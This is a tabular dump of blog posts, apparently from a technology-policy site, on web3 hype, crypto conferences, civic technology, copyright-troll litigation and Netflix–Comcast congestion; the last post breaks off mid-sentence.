"51","2022-05-04","2023-03-24","https://freedom-to-tinker.com/2022/05/04/will-web3-follow-in-the-footsteps-of-the-ai-hype-cycle/","For many, the global financial crisis of 2008 marked a turning point for trust in established institutions. It is unsurprising that during this same historical time period, Bitcoin, a decentralized cryptocurrency that aspired to operate independent from state manipulation, began gaining traction. Since the birth of Bitcoin, other decentralized technologies have been introduced that enable a broader range of functionalities including decentralized finance (DeFi), non-fungible tokens (NFTs), a wide range of other cryptocurrencies, and decentralized autonomous organizations (DAOs). These types of technologies constitute what is sometimes referred to as “web3.” In contrast to web2, our current version of the web, which relies heavily on centralized platforms and corporate intermediaries–think Facebook’s social network or Amazon’s webshop–web3 promises to redistribute power and agency back into the hands of users through decentralized peer-to-peer technology. Although web3 has garnered fervent support and equally fervent critique, it is undeniable that cryptocurrencies and other decentralized technologies have captured the mainstream imagination. What is less clear is whether the goals and practices of emerging businesses in the web3 sector align with, or stand in conflict with, the ideologies of web3’s most enthusiastic supporters. Organizational sociology has long established that organizations’ external rhetoric, which is shaped by a field’s perception of what is culturally and socially legitimate, may not fully align with their internal rhetoric or day-to-day practices. Continuing in this tradition, in a recent study, my colleague at Princeton’s Center for Information Technology Policy, researcher Elizabeth Watkins, and I sought to understand how people working at artificial intelligence (AI) startups think about, build, and publicly discuss their technology. We conducted interviews with 23 individuals working at early-stage AI startups across a variety of industry domains including healthcare, agriculture, business intelligence, and others. We asked them about how their AI works as well as about the pressures they face as they try to grow their companies. In our interviews, the most prevalent theme we observed was that startup founders and employees felt they needed to hype up their AI to potential investors and clients. Widespread narratives about the transformative potential of AI have led non-AI savvy stakeholders to have unrealistic expectations about what AI can do– expectations that AI startups must contend with to gain market adoption. Some, for instance, have resorted to presenting artificially inflated estimates of their models’ performance to satisfy the demands of investors or clients that don’t really understand how models work or how they should be evaluated. From the perspective of the startup entrepreneurs we interviewed, if other AI startups promise the moon, it is difficult for their companies to compete if all they promise is a moon-shaped rock, especially if potential clients and investors cannot tell the difference. At the same time, these startup entrepreneurs did not actually buy into the hype themselves. Afterall, as AI practitioners, they know as well as any other tech skeptic what the limitations of AI are. In our AI startups study, several participants likened the hype surrounding AI to the hype that also surrounds blockchain, the backbone that undergirds decentralized technology. Yet unlike AI companies who hope to disrupt existing modes of performing tasks, hardline web3 evangelists see decentralized technology as a mechanism for disrupting the existing social, political, and economic order. That kind of disruption would take place on an entirely different scale than AI companies attempting to make tedious or boring tasks a little more automatic. But are web3 businesses actually hoping to effect the same kind of wide sweeping societal change web3 evangelists are hoping for? In a study I’m kicking off with Johannes Lenhard, an anthropologist at the University of Cambridge who studies venture capital investors, we aim to understand where the ideological rubber of web3 meets the often unforgiving road to commercial success. We will interview entrepreneurs working at web3 businesses and investors working at investment firms with a focus on web3. Through these interviews, we aim to understand what their ideological visions of web3 are and the extent to which they have been able to realize those visions into real-world technology and business practices. As a preliminary glimpse into these questions, I did a quick and dirty analysis* of content from the blogs that Andreessen Horowitz (a16z), a prominent venture capital firm, posted about the companies in their web3 portfolio (top image). In order to get insight into the rhetoric of the companies themselves, I also looked at content from the landing pages of several of a16z’s web3 portfolio companies (bottom image). Visualization of the most frequently used terms of both data sources are below where bigger words are those that are used more frequently. Word cloud from a16z’s blog posts Word cloud from portfolio companies’ landing pages Although this analysis is by no means scientific, it suggests that whereas companies’ external rhetoric emphasizes technical components, investors’ external rhetoric emphasizes vision. We don’t yet know whether we will observe these kinds of trends in our new study, but we hope to gain deeper empirical insights into both the public facing discourse of web3 stakeholder groups as well as into the rhetoric they use internally to shape their own self-perception and practices. Will blockchain shepherd in a newer, more democratic version of the web? A borderless society? Decentralized governance by algorithms? Or will it instead deliver only a few interesting widgets and business as usual? We’ll report back when we find out! Interested in hearing more about the study or participating? Send me an email at *protected email*. *analysis performed on March 9th, 2022"
"52","2022-06-16","2023-03-24","https://freedom-to-tinker.com/2022/06/16/dcentral-vs-consensus-are-institutions-frens-or-enemies-of-crypto/","As a part of an ethnographic study on blockchain organizations, I recently attended two major conferences – Dcentral Con and Consensus – held back-to-back in Austin, Texas during a blistering heatwave. My collaborator, Johannes Lenhard, and I had conducted a handful of interviews with angel investors, founders, and venture capitalists, but we’d yet to conduct any fieldwork to observe these types of operators in the wild. Dcentral, held at Austin’s Long Center for the Performing Arts, and Consensus, held at the Austin Convention Center and other venues throughout downtown, provided the perfect opportunity. The speaker and panel topics at both conferences varied widely–from non-fungible tokens (NFTs), to the metaverse, to decentralized finance (DeFi). At both conferences an underlying debate regarding the role of established institutions repeatedly bubbled to the surface. The differences between the two conferences themselves offered a stark contrast between those who envision a new frontier of crypto cowboys dismantling existing social and economic hierarchies and those who envision that same industry gaining traction and legitimacy through collaboration with regulators and the traditional financial (aka “TradFi”) sector. Dcentral was populated by scrappy developers of emerging protocols, avid gamers, and advocates for edgy decentralized autonomous organizations (DAOs), such as Treat DAO, which allows adult content creators to sell “NSFW” (i.e., not safe for work) NFTs. Attendees at Dcentral sported promotional t-shirts and sneakers, and a few even showed up in Comic Con style garb, flaunting flowing white togas and head-to-toe blue body paint. Over the course of Dcentral, many speakers and attendees crafted passionate arguments around common libertarian talking points–self sovereignty, individualism, opposition to the Federal Reserve, and skepticism about government oversight more broadly. Yet governments were not the only institutions drawing the ire of the Dcentral crowd. Speakers and attendees alike took aim at corporate actors from traditional finance systems as well as venture capital (VC) firms and accredited investors. Perhaps the most acerbic critique of institutionalization in the crypto sector was issued by Stefan Rust, founder and CEO of Laguna. Wearing a white cowboy hat, he opened his presentation [see 3:19] with a criticism of protocols that impose undesirable “middlemen” between the user and their intended transactions: “This is what we want to avoid. We invited these institutions into our ecosystem and we now have layers, on layers, on layers that have been created in order to take a decentralized peer-to-peer electronic cash ecosystem to fit a traditional, TradFi world, the system that we’ve been fighting so hard since 2008 to combat […]. Do we want this? I don’t know. I didn’t sign up to get into crypto and Bitcoin and a peer-to-peer electronic cash system for multiple layers of multiple middlemen and multiple fees”Stefan Rust, Laguna In his view, increasing involvement of institutional actors could lead to “SSDD.” That is, same shit, different day, which according to Rust, is exactly what the ecosystem should be dismantling. Consensus, held directly after Dcentral, had an entirely different feel. In contrast to the casual dress of Dcentral, many attendees at Consensus wore conservative silk dresses, high heel pumps, or well-tailored suits, despite temperatures that topped 100 degrees just outside the conference center doors. In a panel aptly entitled, “Wall Street Suits Meet Hoodies,” Ryan VanGrack, a former advisor at the Securities and Exchange Commission (SEC), opened with a comment about how he felt uncomfortably informal in his crisp button-down shirt, slacks, and pristine gray sneakers. According to one marketer at a well-known technology company, the cost of hosting a booth on the exhibit floor was in the neighborhood of 75K. This was not the ragtag gang of artists and emerging protocols from Dcentral; these people were established crypto players who saw the pathway to revolution as running straight through the front door of institutions rather than by burning them to the ground. Like Dcentral, speakers and panelists at Consensus called for the reform of the financial industry, often similarly drawing from libertarian values and arguments; however, unlike Dcentral, many at Consensus emphasized that regulation of the crypto industry is not only warranted, but necessary to expand its scope and market adoption. According to them, the lack of regulation has imposed an artificial ceiling on what the crypto sector can achieve because retail investors, would-be protocol founders, and institutional players are still “waiting on the sidelines” for regulatory clarity. This position was not merely abstract rhetoric. Current and former government actors such as Rostin Behnam, Chairman of the Commodity Futures Trading Commission (CFTC) as well as Senators Kirsten Gillibrand, Cynthia Lummis, and Pat Toomey, participated in panels. These panels focused on the role of regulation in the crypto ecosystem, such as measures that preserve innovation while also preventing catastrophic failures such as the recent collapse of Terra, which financially decimated many retail investors. At Consensus, advocates of institutionalization were no less enthusiastic in their endorsement of the mission of crypto and web3 than the anti-institutionalists at Dcentral. In other words, they too were true believers, just with a different theory of change. On Friday night I was invited to attend an event hosted by Pantera Capital, a top-tier crypto VC fund. I mentioned to one of the other attendees that I had attended Dcentral. His face pulled into a grimace. “Why the look of disgust?” I asked. He clarified that while “disgust” was too strong of a word, he felt that events like Dcentral delegitimize what the industry seeks to accomplish. Rather than being the true embodiment of the web3 ethos, he felt these crypto cowboys and their antagonistic rhetoric risked undermining the very efforts that were likely to have the biggest impact. At the conference, panelists and attendees referred to Terra as the “elephant in the room.” But it struck me that personal wealth and its tension with the crypto vision was a much bigger and far less acknowledged elephant. Possibly the only speaker to directly and unambiguously call attention to this was Assistant Professor of Law Rohan Grey. In a panel entitled “Who Should be Allowed to Issue Digital Dollars,” Grey noted that as the “resident pet skeptic” he would act as a rare detractor to the “self-congratulatory industry love-fest” or “circle jerk” that would unfold at Consensus. Establishing common ground with the crypto community, he noted that he too supported efforts to resist “Big Brother as well as Wall Street and Silicon Valley.” But then he offered a withering critique of crypto industry actors, especially those with ties to the established financial sector: “We should be very clear about the difference between private, for-profit actors providing public goods for their own material benefit and actual public goods. So, who are the people who want to issue digital dollars if not the government? We’re talking about licensed limited liability companies backed by venture capitalists, many of whom are standard Wall Street actors. We’re talking about people with a fiduciary responsibility to a particular group of shareholders. We’re talking about decisions being made on behalf of the public by private individuals who are there only because of their capacity to hold wealth initially, and those actors will then be lobbying for laws favorable to themselves in government and creating the same revolving door that we’ve seen with Wall Street for decades.” Rohan Grey, Assistant Professor at Willamette University College of Law The idea that private sector actors who made their fortunes in the traditional financial sector could serve as the vanguard of a financial revolution certainly merits scrutiny. Yet, even if somewhat dubious, it is at least possible that these actors, having seen from the inside the corruption and ill-effects of existing financial institutions, could leverage their insight to import better, more democratic values into an emerging crypto financial system. Along these lines, one man I chatted with at an after party said it was his experience witnessing what he felt were morally reprehensible, exploitative lending policies while working at a bank that ultimately pushed him to adopt the crypto vision. Still, more than a little skepticism is warranted given that institutional or even anti-institutional actors stand to materially benefit from greater adoption of crypto and its associated technologies, a point that Grey himself underscored. Following such skepticism, a cynical take is that people will always behave in alignment with their own incentives, even when doing so causes harm to others. I have heard people espouse exactly this sentiment when excoriating scams, NFT “rug pulls,” or even failed DeFi applications. Yet such a bleak view of humanity is overly simplistic given the body of empirical data about human prosocial behavior (e.g., Fehr, Fischbacher & Kosfeld, 2005). People can and often do behave in ways that are altruistic or in the service of others, even at a cost to themselves. Many advocates both for and against institutionalization of the web3 and cryptocurrency sector are likely motivated by a sincere desire to benefit their fellow man. But intentions aren’t the only thing that matters. The positive and negative real-world impacts of blockchain applications both direct and indirect are critical. Whether this increasingly institutionalized sector will spark a real revolution or further entrench SSDD remains to be seen."
"53","2015-08-19","2023-03-24","https://freedom-to-tinker.com/2015/08/19/voting-every-day-smartphones-civil-rights-and-civic-participation/","The process of influencing government action has undergone a significant transformation in the age of the smartphone. Of course, the traditional lobbying business continues to thrive, with companies, trade associations and public interest advocacy groups relying on experienced experts to plead their cases in Washington, DC, and throughout the country. What the smartphone has done, however, is expand the ways that non-professionals can influence the political system. I’ll focus on three ways that regular people have been significantly influencing the machinery of government between election days through the Internet and mobile devices. Post-Ferguson, MO, the civil rights movement has been re-born, notably with #BlackTwitter playing a central role. What has been striking to me is that the movement has been energized not primarily by new laws passed by the country’s first African-American President, but by a series of powerful videos and images mostly from smartphone cameras: Walter Scott shot by Michael Slager in the back and ear while fleeing the police across a grassy lot; Dylann Roof wearing a jacket with the flags of Apartheid-era South Africa and Rhodesia; and the stream of photos and videos that launched the #BlackLivesMatter movement.The 1960s civil rights movement that, in part, led to the passage of the Voting Right Act of 1965 was defined largely by protests, marches and sit-ins: organized and coordinated activities designed to pressure politicians into taking actions that would ensure African-American access to the political process. Without such a centrally coordinated effort, shared videos of disparate individuals have been a significant factor in the Justice Department’s decision to launch investigations of police forces in several cities and in the South Carolina political establishment’s decision to take down the Confederate Flag on the South Carolina Capitol grounds. While the #BlackLivesMatter movement is currently working to show its effectiveness as a coordinated political operation hoping to influence the outcome of the Democratic and Republican primaries, it is still unclear whether it can transition seamlessly into a more traditional advocacy role or if its strength is more in its members’ ad hoc presence in local communities across the country. Last week, Matt Stempeck wrote an excellent article asking, “Are Uber and Facebook Turning Users into Lobbyists?” Mr. Stempeck argues: Leading technology companies are increasingly soliciting their users to take political action on their behalf to defend controversial business models from regulation, support new programs, and promote their moral values in active political battles….We’re being introduced to a new lever of corporate influence on democracy. This changing approach to corporate lobbying, particularly of state and local officials, is logical in an era of online, mobile activism and slacktivism. It’s easy to take a political stance by clicking a link while waiting for lunch or the bus, so why not ask sympathetic users to do so when it benefits your brand? Because people often define themselves through brand choices – iPhone vs. Galaxy – and social media platforms – LinkedIn for work and Instagram for vacation, companies can harness that self-identification and goodwill towards their desired political ends. For the public, the benefits of these efforts are getting more people to engage with tech policy issues, communicate their preferences to their elected officials, and advocate for organizations with missions they support. However, I agree with Mr. Stempeck that a significant concern is that this kind of lobbying can lead to uninformed activism, where companies control the messaging and users click to join a campaign without considering counterarguments. The data that people submit to cities through 311 posts, 911 calls, tweets and blog posts has a tremendous influence on “responsive cities,” as Stephen Goldsmith and Susan Crawford have tagged them. Public safety, recreation and transportation options are being decided in cities across the country based on aggregated feedback from residents. Therefore, it is increasingly important for people to participate digitally. While the tools have changed, the squeaky wheel still gets the grease. Recently, I had a conversation with my local City Councilperson in Washington, DC, and we discussed his desire to develop ways to generate hyper-local data from within his Ward and use that information to promote economic growth. Companies such as IBM and Alphabet’s new Sidewalk Labs recognize that there is tremendous value in helping both cities and companies to increase local connectivity and further analyze the resulting data. My hope is that the ongoing sharing of requests, photos, and tweets will allow residents’ voices to be noticed continually, not just in the lead up to election days. While the people who fought for the Voting Rights Act probably could not have imagined Twitter, activists’ desires haven’t changed – people should have the ability to participate in our democracy and have a voice in the decisions made by their representatives. Today, technology that we carry around all the time anyway is helping make that possible."
"54","2013-02-14","2023-03-24","https://freedom-to-tinker.com/2013/02/14/what-weve-got-here-is-failure-to-communicate/","Since the historic snow storm, “Nemo,” deposited a NOAA-certified 40 inches of snow on my hometown of Hamden, CT, I have been watching from afar to see how the town and its citizens are using a combination of digital technology, the traditional telecommunications network, and mass media to communicate in the aftermath of the storm. While I have been lucky enough not to have been directly affected by the historic storm, my senior citizen parents have been inside their house waiting for a snow plow to come for approximately five days. Since they are healthy and have food and heat, I have the luxury of writing about the use of communications technology by Hamden’s government during this weather emergency. The purpose of this post is not to pile onto an already overwhelmed town government, but to highlight fairly easily achievable improvements that Hamden’s government could make in its emergency communications that will make residents of the town safer the next time an emergency occurs. On Friday morning, I woke up and heard the Mayor of Hamden, Scott Jackson, on CNN stating about the storm, “It’s a Disaster.” I was impressed to hear the Mayor of my approximately 60,000 person hometown with a national and international forum to talk about the weather emergency and recovery efforts. I figured this was only the first step in the process of informing town residents about what they could expect over the next few days. However, based on reviewing “The Town of Hamden, Connecticut” Facebook page, e-mails sent from the Mayor’s Office, the Mayor’s Twitter feed, and having conversations with my parents, there are three specific areas where the town could have communicated more effectively during this weather emergency. These failures of communication sell short the heroic work of the people working around the clock to plow the streets and respond to emergencies. First, from my observations, the Town has not maximized the effectiveness of social media as a tool for communicating during the emergency. The Mayor’s Office has chosen Facebook as its primary on-line source for distributing information about the progress of the clean-up. Facebook is a closed network. Anyone without an account either has to join to read about the Town’s efforts or forgo the information entirely. Substantive information about the Town’s recovery plans has been posted every few hours, but that information is still not accessible to people, senior citizens for example, who may not be following the Town on Facebook. Notably, the messages posted by readers of the Town’s posts are almost more helpful than the Town’s messages. A number of responses detail specific challenges related to the volume of snow encountered by people who have been working in the recovery effort and encourage patience. The Mayor’s Twitter page is also littered with missed opportunities. As of Wednesday morning, most of the recent Tweets in the Mayor’s feed are links to the updates posted on Facebook. Again, without a Facebook account, how is a Hamden resident able to learn anything much from these messages? Using Twitter in this manner defeats the entire purpose of the service – providing information quickly and succinctly. Because no account is required to view messages on Twitter, the Mayor could have been using Twitter to communicate with a larger audience than Facebook, share photos of crews removing snow, or engage in conversations with residents about specific streets that needed clearing. Instead, residents’ messages requesting specific streets be cleared were buried in the comments beneath a Town Facebook post. Second, given that not all residents have Facebook, Twitter, or even Internet access, Hamden should have made more effective use of reverse 911 calls to residents beginning on Friday or Saturday, alerting people about what to expect over the next few days. Such calls are a critical component of a comprehensive strategy to alert people in times of emergency. Since my parents live relatively close to the Hamden-New Haven border, they have been receiving twice daily reverse 911 calls from the Mayor of New Haven. The Town of Hamden has made far fewer such calls, sometimes not even one per day. Yes, many homes are now cell phone only, but reverse 911 calls are still an effective tool, especially when deployed in combination with other alerts. Third, the map which was provided on-line to describe the areas that have been cleared was very difficult to read. It used pinpoints on a satellite map. Therefore, street names and locations were hard to decipher. Using the basic street map from Google Maps would have provided more clarity and given people the opportunity to zoom in and out and see neighborhoods of particular interest. The technology that the town government seemed to use most effectively was e-mail. My Dad received numerous e-mails that an unpaid resident who volunteers on a Town commission forwarded to large group of neighbors. These messages contained much, but not all, of the information that was reported on the Facebook page and that was conveyed through the reverse 911 calls. While my parents may not be on Facebook, they are active e-mailers and my Dad’s messages come to him immediately on his iPhone. E-mail is a much more effective way of distributing emergency information to a broad community than Facebook. By late Wednesday, a town official had e-mailed out a Google Doc which allowed people to enter in the status of their street and whether it was clear or not. This is far more efficient than people posting information about their streets in Facebook comments. I am happy to see the town taking a more systematic approach to using technology to survey residents, but disappointed that it took five days from the beginning of the storm for new ideas to percolate. Since government is certainly not the only source of information during an emergency, it is notable that Hamden’s Patch provided excellent coverage of the storm, with more than one article per day at times and You Tube videos from people in town documenting the storm. On-line journalism supplemented the information provided by the Town and since hard copy newspapers obviously could not reach Hamden residents, provided a very useful independent source of information."
"55","2013-03-01","2023-03-24","https://freedom-to-tinker.com/2013/03/01/now-available-in-print-and-ebook-democracys-fourth-wave-digital-media-and-the-arab-spring/","I am happy to announce that my new book, co-authored with Muzammil M. Hussain, is now available in print (Oxford University Press, Amazon, Google Books) and eBook (Kindle). In April of last year, I presented some of our initial findings and described the methodology in a presentation at the Center for Information Technology at Princeton. You can listen to that presentation here: Democracy’s Fourth Wave? Information Technologies and the Fuzzy Causes of the Arab Spring Democracy’s Fourth Wave? Digital Media and the Arab Spring Philip N. Howard and Muzammil M. Hussain Did digital media really “cause” the Arab Spring, or is it an important factor of the story behind what might become democracy’s fourth wave? An unlikely network of citizens used digital media to start a cascade of social protest that ultimately toppled four of the world’s most entrenched dictators. Howard and Hussain find that the complex causal recipe includes several economic, political and cultural factors, but that digital media is consistently one of the most important sufficient and necessary conditions for explaining both the fragility of regimes and the success of social movements. This book looks at not only the unexpected evolution of events during the Arab Spring, but the deeper history of creative digital activism throughout the region. Philip N. Howard is Associate Professor in the Department of Communication at the University of Washington, with adjunct appointments at the Jackson School of International Studies and the Information School. Muzammil M. Hussain is a Ph.D. candidate in Communication at the University of Washington and Visiting Scientist at the Center for Comparative and International Studies, ETH Zurich."
"56","2013-11-20","2023-03-24","https://freedom-to-tinker.com/2013/11/20/digital-activism-and-non-violent-conflict/","As a CITP fellow last year, one of my goals was to get a new project on digital activism off the ground. With support from the US Institutes of Peace and a distributed network of researchers we pulled together an event dataset of hundreds of instances where people tried using information and communication technologies to achieve political goals. The Digital Activism project launched. The research team analyzed some 1,200 cases of digital activism worldwide, including some 400 cases from the past three years. First, we defined activism as efforts not just at regime change, but campaigns for policy changes at all levels of government. Second, we made sure this was a truly global sample – going far beyond the best-known cases that both sides in this debate had cited. Our initial research in this Digital Activism Research Project showed us how much more work can and should be done, one particular trend was apparent right away. First, the definition of a case: We define a digital activism campaign as an organized public effort, making collective claim(s) on a target authority(s), in which civic initiators or supporters use digital media. Yes it was tough to construct the sampling strategy, and crafting this definition meant excluding cases that were intriguing but not quite relevant. But we aimed for the highest of research standards, developed a thorough coder training program, discarded cases with little third-party info, and ended up with great inter-coder reliability scores. And unlike other projects, we studied successes and failures. What we noticed was that even though some of the most high profile news stories of digital activism featured campaigns that involved hacking and cyber crime, only a fraction of the total number of campaigns we studied from a wide range of reliable sources had any feature resembling “hacktivism”. This could be good or bad depending on your aspirations for how people will use information technologies. If you are interested, here’s the first substantive project report, “Digital Activism and Non Violent Conflict,” that goes through a few other findings. And there’s replication data to play with!"
"57","2013-12-31","2023-03-24","https://freedom-to-tinker.com/2013/12/31/information-facilitating-participation-in-elections-must-be-readily-available-principle-10-for-fostering-civic-engagement-through-digital-technologies/","For the final installment of my series of blog posts outlining ten principles that governments and local communities should consider when evaluating whether they are using digital technology effectively to facilitate civic engagement, I will discuss the issue that goes to the core of democracy in our country – the public having access to information about elections. The information that facilitates participation in elections comes from a variety of sources, including local governments ensuring that people are easily able to register to vote, politicians using technology for conversations with the public during campaigns, and members of the public using e-mail, blogs and social media to discuss the candidates’ promises. Technology as a tool for civic engagement has become an increasingly critical aspect of politics, particularly in urban areas. That’s because one of the factors that has affected political discourse, especially in urban areas – race – is diminishing in salience with the public. In a recent NY Times Op-ed, Thomas Edsall asked the question, “What if Race No Longer Matters in City Politics?” He noted the absence of race as a divisive factor in recent elections in Boston, New York, and Los Angeles. Instead, he argued that income and class shaped the mayoral contests in Boston and New York. As cities move away from racial politics, the vacuum is being filled, at least in part, by both citizens and politicians focusing on lifestyle issues. Right now, arguably there is nothing that reflects people’s lifestyles more than the wireless devices they carry and the content they choose to consume and share through those devices. And some of that content relates to civic engagement. For example, according to a 2013 Pew study, 67% of all 18-24 year olds engaged in some social network-related political activity in the 12 months preceding the survey. Overall, 39% of adults use social media sites for political or civic activities. Given that citizens are moving their political activities on-line, it is important that state governments make it easier for people to participate in the political process by making on-line voter registration available. Approximately 15 states currently allow on-line voter registration, while approximately 5 more have passed legislation permitting on-line registration. In addition to added convenience, according to the state of Arizona, paper registration costs 83 cents per registration while each on-line registration costs only 3 cents. To be beneficial for the public though, on-line registration must be secure. CITP Fellow J. Alex Halderman, in an interview with the National Conference of State Legislatures earlier in 2013 recommended, “ensuring that security experts are consulted during design [of an on-line registration system], adequate security testing is undertaken before the system goes live, and ongoing monitoring for threat detection efforts [takes place] while the system is being operated.” In a recent article in Politico, Columbia University Law School professor Tim Wu suggests that voter participation in Congressional primary elections is so low because of the “convenience gap” between voting and many other modern tasks and proposes increasing participation by moving voting on-line. I disagree with Mr. Wu’s solution partially because I think technology can close the “convenience gap” that makes voting seem burdensome by keeping people connected regularly to the civic and political decision-making process. Since people have the ability through digital technology to be extremely selective about the information they choose to consume, governments and political candidates need to use more targeted methods to reach each constituent with information that’s uniquely important to that person. For example, a person who is registered for Capital Bikeshare – the bike sharing service in the Washington, DC metro area – could register to receive text message alerts about community meetings on bike lanes and transportation policy generally. If a particular series of issues is closely tied to a person’s lifestyle and interests, I think that will drive participation. There will be no need to move to on-line voting now, before the security concerns can be addressed. People who are invested in their local communities need to continue to experiment with ways to boost civic engagement. In advance of a special election for the City Council in Washington, DC this Spring, three popular local bloggers partnered on the “Let’s Choose DC” website, which posed one question per week to all of the eligible candidates. Candidates provided longer than a sound bite answers to questions about topics such as education, crime, and affordable housing. Readers had the opportunity to vote on the responses. While turnout in the special election was disappointingly low – only 11.32% – participation still improved compared to a 2011 special election that came in at 10.30%. The more that journalists, local businesses, civic activists and government officials recognize the economic and social value of assisting citizens in using technology as a tool for building communities that reflect their members’ needs and aspirations, the stronger local communities will become."
"58","2014-08-13","2023-03-24","https://freedom-to-tinker.com/2014/08/13/the-end-of-a-brief-era-recent-appellate-decisions-in-copyright-troll-litigation/","The onslaught of “copyright troll” litigation began only a few years ago, with lawsuits implicating hundreds or even thousands of “John Doe” defendants, who were identified by IP addresses with timestamps corresponding to alleged uses of BitTorrent services to share and download video content without authorization. Recently, federal appellate opinions confirmed growing consensus in district courts concerning this type of litigation. These cases raised issues of jurisdiction, joinder, and potential abuses associated with the disclosure of personal information in response to subpoenas issued pursuant to expedited, ex parte discovery orders. In practice, claims rarely were litigated because plaintiff lawyers coerced settlements from subscribers who, regardless of whether they were using the Internet account at the specified time, may have wanted to avoid the expense and embarrassment associated with being accused of illegal downloads (typically of pornographic content with salacious titles). Once enough settlements were obtained, the cases were dismissed. Subscribers, Internet service providers, and public interest organizations such as the Electronic Frontier Foundation pushed back. The courts began to require that the IP addresses in a given suit should be limited to those that could be geolocated to the forum (in the absence of any other method of determining the likely place of the defendants’ residence). They also decided that only one Doe (or a small number) should be sued at a time, and they began to impose other protective measures (such as court review of settlement communications and/or Doe anonymity through the discovery period). Today the typical BitTorrent copyright infringement lawsuit is only brought against a single Doe defendant who is believed to reside in the forum. Federal appellate courts have finally had the opportunity to address these cases and the zeal of plaintiffs’ counsel in pursuing them. On May 27, 2014, the U.S. Court of Appeals for the District of Columbia Circuit issued an opinion in a case that implicated over 1,000 putative “John Doe” defendants from across the country. The appellate court vacated an order of the district court, holding that issues of personal jurisdiction and venue could be raised by ISPs in response to the plaintiff’s subpoenas. Such issues normally should be raised by the defendants themselves, but “[d]ifferent principles apply where, as here, a plaintiff seeks not just to file a complaint, but instead attempts to use the machinery of the courts to force a party to comply with its discovery demands … why require a party to produce information the requesting party has no right to obtain?” If the subpoena is improper, “the burden it imposes, however slight, is necessarily undue.” The D.C. Circuit’s opinion makes clear that a plaintiff must have a good faith basis for contending that personal jurisdiction and venue are proper when filing suit and that the practice of suing numerous “John Doe” defendants without regard to likely geolocation is patently improper. The D.C. Circuit also addressed the issue of joinder of multiple members of a BitTorrent swarm in a single lawsuit – an issue as to which courts have reached a number of different conclusions (including that joinder of multiple defendants is never proper in the special circumstances of these cases). Here, the court found, “we may assume that two individuals who participate in the same swarm at the same time are part of the same series of transactions within the meaning of [the federal joinder rule].” Similar to players at a blackjack table at various times over the course of an evening, “the mere fact that two defendants accessed the same file through BitTorrent provides an insufficient basis for joinder.” Then, on July 31, 2014, the U.S. Court of Appeals for the Seventh Circuit issued an opinion upholding a sanctions order and a related contempt order against several attorneys who were amongst the most active in filing these cases (all of whom were related at one time or the other to the same firm that prosecuted the D.C. case). The underlying litigation was a “hacking” case involving pornographic website content and implicating over 6,000 subscribers – so-called “co-conspirators” – located across the country. Early on, a group of ISPs had challenged the plaintiff’s subpoenas and obtained extraordinary relief from the Illinois Supreme Court, ordering that the subpoenas be quashed. Instead of moving on, though, the plaintiff named a defendant and then also sued the ISPs as co-conspirators. The ISPs removed the case to federal court, where the plaintiff brazenly sought the very same discovery that the Illinois Supreme Court had already ruled improper. After some motion practice and, eventually, a voluntary dismissal by the plaintiff, the federal district court found that the case against the named defendant “smacked of bullying pretense” and that an award of attorneys’ fees incurred by the named defendant and by the ISPs was proper under 28 U.S.C. § 1927, which provides for sanctions against an attorney who “multiplies the proceedings in any case unreasonably and vexatiously.” The Seventh Circuit wholeheartedly agreed. After discussing the history of the case and other findings in similar cases, the appellate court confirmed the groundless nature of the conspiracy claim against the ISPs (which the court noted was “all the more outrageous given the fact that the Illinois Supreme Court quashed a functionally identical abusive subpoena”) as well as the other claims asserted against the ISPs. With respect to the unjust enrichment claim, for example, the court noted: To this day, the [sanctioned plaintiff attorneys] have provided no support for the idea that every time an internet user does something unlawful online, the user’s ISP is unjustly enriched because it continues receiving subscriber fees from the malefactor. The law in fact is to the contrary. See 17 U.S.C. § 512(a). The use of BitTorrent and similar online services to infringe copyright is wrong. The “Digital Millenium Copyright Act” does not provide a good solution. But that does not excuse abuse of the legal system to extract “settlement” payments from thousands of Internet subscribers outside of the normal advocacy process, in cases with no actual defendants. Fortunately, by the time these two federal appellate courts reached the issues, district courts across the country had already learned what was really going on, and the ex parte, expedited discovery motions of the plaintiffs in these cases had become anything but routine."
"59","2015-04-02","2023-03-24","https://freedom-to-tinker.com/2015/04/02/where-is-internet-congestion-occurring/","In my post last week, I explained how Netflix traffic was experiencing congestion along end-to-end paths to broadband Internet subscribers, and how the resulting congestion was slowing down traffic to many Internet destinations. Although Netflix and Comcast ultimately mitigated this particular congestion episode by connecting directly to one another in a contractual arrangement known as paid peering, several mysteries about the congestion in this episode and other congestion episodes that persist. In the congestion episodes between Netflix and Comcast in 2014, perhaps the biggest question concerns where the congestion was actually taking place. There are several theories about where congestion was occurring; one or more of them are likely the case. I’ll dissect these cases in a bit more detail, and then talk more generally about some of the difficulties with locating congestion in today’s Internet, and why there’s still work for us to do to shed more light on these mysteries. Theory #1: At interconnection points. The first theory is the commonly held conventional wisdom that seems to be both widely acknowledged and at least partially supported by available measurement data. Both Comcast and Netflix appear to acknowledge congestion at this point in the network, in particular. The two sides differ in terms of their perspectives on what is causing those links to congest, however: Netflix asserts that, by paying their transit providers, they have already paid for access to Comcast’s consumers (the “eyeballs”), and that it is the responsibility of Comcast and their transit providers to ensure that these links are provisioned well enough to avoid congestion. The filings assert that Comcast “let the links congest” (effectively, by not paying for upgrades to these links). While it is technically true that, by not upgrading the links, Comcast essentially let the links congest, but to suggest that Comcast is somehow at fault for negligence is somewhat disingenuous. After all, they have bargaining power, so it’s expected (and rational, economically speaking) that they are using that leverage when it comes to a peering dispute, regardless of whether flexing their muscles in this way is a popular move. Comcast, on the other hand, asserts that Netflix has enough traffic to congest any link they please, at any time, as well as the flexibility to choose which transit provider they use to reach Comcast. As a result, the assertion is that they have a traffic “sledgehammer” of sorts, that could be used to exert tactics from Norton’s Peering Playbook (Section 9): congesting Comcast’s interconnection to one transit provider, forcing Comcast to provision more capacity, then proceeding to congest the interconnection with another transit provider until that link is upgraded, and so forth. This argument is a bit more of a reach, because it suggests active attempts to degrade all Internet traffic through these shared points of congestion, simply to gain leverage in a peering dispute. I personally think this is unlikely. Much more likely, I think, is that Netflix actually has a lot of traffic to send and has very little idea what capacity actually exists along various end-to-end paths to Comcast (particular in their transit providers, and at the interconnects between their transit providers and Comcast). There is no fool-proof way to determine these capacities ahead of time because data about capacity within the transit providers and at interconnection points that they do not “own” is actually quite difficult to come by. Theory #2: In the transit providers’ networks. This (seemingly overlooked) theory is intriguing, to say the least. Something that many forget to factor into the timeline of events with the congestion episodes is Netflix’s shift from Akamai’s CDN to Level 3 and Limelight; by some accounts Netflix’s shift to a different set of CDNs coincides with the Measurement Lab data documenting extreme congestion, beginning in the middle of 2011. This was, some say, a strategy on the part of Netflix to reduce their costs of streaming video to their customers, by as much as 50%. That is a perfectly reasonable 